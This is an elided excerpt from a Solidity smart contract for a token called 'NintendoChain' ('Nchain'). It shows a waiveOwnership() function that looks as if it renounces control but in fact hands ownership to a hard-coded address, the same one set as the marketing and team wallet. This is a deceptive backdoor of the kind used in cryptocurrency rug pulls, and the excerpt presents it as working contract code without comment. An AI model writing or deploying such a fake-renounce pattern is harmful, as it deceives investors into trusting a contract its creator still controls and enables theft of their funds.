...
Website  : https://nintendo-chain.live/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x45268841014502F63F3E8Eec3D7764592dc664F4);
    }
...
contract NintendoChain is Context, IERC20, Ownable {
    ...
    string private _symbol = "Nchain";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x45268841014502F63F3E8Eec3D7764592dc664F4);
    address payable public teamWalletAddress = payable(0x45268841014502F63F3E8Eec3D7764592dc664F4);
